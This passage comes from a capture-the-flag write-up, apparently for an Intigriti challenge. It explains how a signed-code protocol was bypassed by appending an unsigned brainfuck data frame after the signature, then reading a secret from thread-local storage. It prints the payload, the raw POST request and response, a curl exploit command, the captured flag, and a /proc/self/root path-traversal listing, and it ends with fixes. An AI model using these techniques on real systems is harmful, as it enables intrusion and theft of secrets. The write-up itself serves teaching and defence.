+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>tape base vs flag</span><span>arithmetic</span></div>
+<pre>tape base = fs:0x0 - <span class="k">0x160</span>
+flag      = fs:0x0 - <span class="w">0x060</span>
+
+cell index = (-0x60) - (-0x160) = <span class="ok">0x100</span> = <span class="ok">256</span></pre>
+      </div>
+      <figcaption>The tape overlaps the secret. No write, no corruption, no escape needed &mdash;
+        just walk right and read.</figcaption>
+    </figure>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>the payload</span><span>brainfuck</span></div>
+<pre><span class="k">&gt;</span> &times; 256        <span class="c">// walk the pointer to cell 256</span>
+<span class="k">.&gt;</span> &times; 81        <span class="c">// print 81 bytes and keep walking</span>
+
+<span class="c">// 418 bytes, NUL-padded to 424 so the hashed length never changes</span></pre>
+      </div>
+    </figure>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 08 &middot; The stream</div>
+    <h2>Five frames, one POST</h2>
+
+    <div class="frames">
+      <div class="frm"><span class="n">00</span><span class="cmd">auth</span><span class="what">the 106-byte constant from <code>.rodata</code></span><span class="off">&mdash;</span></div>
+      <div class="frm hit"><span class="n">01</span><span class="cmd">CODE</span><span class="what">interpreter from <code>-HELP</code>, verbatim</span><span class="off">@0 &middot; 396 B</span></div>
+      <div class="frm hit"><span class="n">02</span><span class="cmd">DATA</span><span class="what">original program from <code>-HELP</code>, verbatim</span><span class="off">@396 &middot; 424 B</span></div>
+      <div class="frm hit"><span class="n">03</span><span class="cmd">SIGN</span><span class="what">the published signature, verbatim</span><span class="off">@820 &middot; 256 B</span></div>
+      <div class="frm swap"><span class="n">04</span><span class="cmd">DATA</span><span class="what"><b>mine</b> &mdash; same length, after the signature</span><span class="off">@1076 &middot; 424 B</span></div>
+      <div class="frm"><span class="n">05</span><span class="cmd">EXEC</span><span class="what">hashes <code>[0, 820)</code>, executes <code>acc+1076</code></span><span class="off">@1500 &middot; 0 B</span></div>
+    </div>
+
+    <p>1651 bytes in total, comfortably inside both the <code>0x400</code> per-frame limit and the
+      <code>0x2000</code> accumulator.</p>
+
+    <div class="wire">
+      <div class="pane">
+        <div class="pane-bar"><span>request</span><b>POST /custom_protocol</b></div>
+<pre>POST /custom_protocol HTTP/1.1
+Host: challenge-1126...intigriti.io
+Content-Length: 1651
+
+SUPER_SECRET_..._341465b5...
+w<span class="hl">&lt;396&gt;</span>CODE&lt;interpreter&gt;
+w<span class="hl">&lt;424&gt;</span>DATA&lt;original&gt;
+w<span class="hl">&lt;256&gt;</span>SIGN&lt;signature&gt;
+w<span class="hl">&lt;424&gt;</span>DATA&lt;mine&gt;
+w<span class="hl">&lt;0&gt;</span>EXEC</pre>
+      </div>
+      <div class="pane">
+        <div class="pane-bar"><span>response</span><b>200 OK</b></div>
+<pre>HTTP/2 200
+x-powered-by: superfastserver
+  Version 2.0.0
+x-envoy-upstream-service-time: 2002
+content-length: 101
+
+ACK ACK ACK ACK ACK
+<span class="hl">INTIGRITI{4c0532a9-f169-4a5d
+-ae02-a8b0671d2b07}</span></pre>
+      </div>
+    </div>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>the whole exploit</span><span>bash</span></div>
+<pre>curl -s --data-binary @body.bin -X POST \
+  https://challenge-1126.challenges.intigriti.io/custom_protocol</pre>
+      </div>
+      <figcaption>Five <code>ACK</code>s and the flag. No race window, no timing dependency, no
+        brute force &mdash; it lands on the first attempt, every attempt.</figcaption>
+    </figure>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 09 &middot; The fix</div>
+    <h2>Hash the buffer you are about to use</h2>
+
+    <p>The verifier and the executor are allowed to disagree about what the signature covers. Close
+      that, and the bug is gone:</p>
+
+    <div class="wire">
+      <div class="pane">
+        <div class="pane-bar"><span>vulnerable</span><b>two addresses</b></div>
+<pre>sha256(acc + code_off,
+       code_len + data_len, digest);
+
+if (verify(digest, acc + sig_off))
+    mapped_code(acc + <span class="hl">data_off</span>, ...);</pre>
+      </div>
+      <div class="pane">
+        <div class="pane-bar"><span>fixed</span><b>one buffer</b></div>
+<pre>struct payload {
+    u32 code_len, data_len;
+    u8  body[];
+};
+
+sha256(p-&gt;body,
+       p-&gt;code_len + p-&gt;data_len, digest);
+if (verify(digest, sig))
+    mapped_code(p-&gt;body + p-&gt;code_len, ...);</pre>
+      </div>
+    </div>
+
+    <p>The minimal patch is one line &mdash; reject anything where
+      <code>data_off != code_off + code_len</code>. The better fix is to make the two impossible to
+      separate, by carrying one signed object instead of three loose offsets.</p>
+
+    <p>Three things would also have blunted it independently:</p>
+
+    <ul>
+      <li><strong>Freeze the session on <code>SIGN</code>.</strong> There is no legitimate reason to
+        append to a signed transaction.</li>
+      <li><strong>Do not load the secret into the thread that runs attacker code.</strong> The flag
+        is read into TLS before the first byte arrives, so <em>any</em> execution primitive in that
+        thread discloses it.</li>
+      <li><strong>Do not hand a signed interpreter a tape that aliases your own memory.</strong> A
+        bounded, zero-filled tape would have made the payload inert even after the bypass.</li>
+    </ul>
+  </section>
+
+  <!-- ============================================ -->
+  <section>
+    <div class="ch">Step 10 &middot; Also in the room</div>
+    <h2>Two smaller doors, left open</h2>
+
+    <p>File reads are confined to the working directory by <code>basename()</code>. Directory
+      listing is not &mdash; it passes the request path straight to <code>opendir()</code>:</p>
+
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>GET /proc/self/root</span><span>200 OK</span></div>
+<pre>. .. bin boot dev etc home lib lib64 media mnt opt proc root
+run sbin srv sys tmp usr var <span class="w">the_real.flag</span> app <span class="w">src</span></pre>
+      </div>
+      <figcaption><code>/..</code> is normalised away by the fronting Envoy, but
+        <code>/proc/self/root</code> reaches the same place without a single <code>..</code>. This is
+        how I confirmed where the flag lived before having any execution at all.</figcaption>
+    </figure>
+
+    <p>And <code>/src</code> lists <code>challenge.c</code>, <code>rsa.c</code>,
+      <code>sha256.c</code> and <code>bf.c</code>. They cannot be read, for the same
+      <code>basename()</code> reason, but knowing the file names tells you the shape of the thing
+      before you open a disassembler. Everything above came from reading the binary; the listing just
+      confirmed I was looking in the right place.</p>
+  </section>
+
+  <!-- ============================================ -->
+  <div class="reveal">
+    <figure>
+      <div class="screen">
+        <div class="screen-bar"><span>POST /custom_protocol</span><span>200 OK</span></div>
+<pre>ACK ACK ACK ACK ACK <span class="ok">INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}</span></pre>
+      </div>
+      <figcaption>One <code>ACK</code> for each frame, then 81 bytes of thread-local storage read out
+        one cell at a time by a brainfuck program the signature never saw.</figcaption>
+    </figure>
+
+    <div class="vault">
+      <div class="osd">SIGNATURE VERIFIED</div>
+      <div class="flag">INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}<span class="caret" aria-hidden="true"></span></div>
+    </div>
+  </div>
+
+  <div class="signoff">
+    <div class="bars" aria-hidden="true">
+      <i style="background:#22D3EE"></i><i style="background:#0EA5B7"></i>
+      <i style="background:#0B6E7A"></i><i style="background:#FBBF24"></i>
+      <i style="background:#FF6B6B"></i><i style="background:#4ADE80"></i>
+    </div>
+    <div class="eot">Signed, sealed, and pointing somewhere else</div>
+    <p class="who"><a href="https://github.com/romilp619">Romil Patel</a></p>
+  </div>
+
+</div>
+
+<script>
+(function () {
+  var root = document.documentElement;
+  try {
+    var saved = localStorage.getItem('theme');
+    if (saved === 'dark' || saved === 'light') root.setAttribute('data-theme', saved);
+  } catch (e) {}
+  var btn = document.createElement('button');
+  btn.className = 'themebtn';
+  btn.type = 'button';
+  btn.setAttribute('aria-label', 'Toggle colour theme');
+  btn.textContent = 'Theme';
+  btn.addEventListener('click', function () {
+    var isDark = root.getAttribute('data-theme') === 'dark' ||
+      (!root.getAttribute('data-theme') && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    var next = isDark ? 'light' : 'dark';
+    root.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+  document.body.appendChild(btn);
+
+  var vault = document.querySelector('.vault');
+  if (vault && 'IntersectionObserver' in window) {
+    vault.classList.add('warming');
+    var io = new IntersectionObserver(function (entries) {
+      entries.forEach(function (e) {
+        if (e.isIntersecting) { vault.classList.add('lit'); io.disconnect(); }
+      });
+    }, { threshold: .4 });
+    io.observe(vault);
+    setTimeout(function () { vault.classList.add('lit'); }, 2500);
+  }
+})();
+</script>
+</body>
+</html>
